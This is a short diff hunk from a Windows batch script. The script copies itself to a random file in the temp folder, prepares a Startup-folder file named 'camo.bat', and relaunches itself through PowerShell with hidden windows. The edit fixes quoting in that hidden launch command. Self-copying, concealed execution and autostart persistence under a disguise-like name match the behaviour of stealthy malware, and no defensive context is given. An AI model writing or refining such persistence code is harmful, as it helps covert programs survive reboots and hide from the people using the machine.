@@ -9,7 +9,7 @@ set "me=%temp%\%random%.bat"
 copy /Y "%0" "%me%"
 
 set "reboot=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\camo.bat"
-set "launch=powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process -WorkingDirectory %temp% -FilePath '%me%' -WindowStyle Hidden""
+set "launch=powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process -WorkingDirectory '%temp%' -FilePath '%me%' -WindowStyle Hidden""
 
 (
     @echo ^@echo off
